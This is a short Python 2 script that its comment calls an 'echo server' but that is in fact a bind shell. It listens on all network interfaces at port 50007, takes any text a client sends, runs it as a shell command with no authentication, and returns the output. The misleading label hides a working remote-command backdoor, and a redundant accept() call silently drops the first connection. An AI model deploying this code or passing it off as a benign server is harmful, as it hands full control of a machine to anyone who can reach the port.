#!/usr/bin/env python
#
#Echo server program
import socket
import commands

HOST = ''  #Symbolic name meaning all available interfaces
PORT = 50007  #Arbitrary non-privileged port
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(5)
conn,addr = s.accept()

while True:
	conn,addr = s.accept()
	print 'Connected by',addr
	while True:
		data = conn.recv(1024)
		if not data:break
		print 'going to run cmd:', data
		status,result = commands.getstatusoutput(data)
		if len(result) == 0:result = "CMD can't execute!"
		conn.sendall(result)
conn.close()
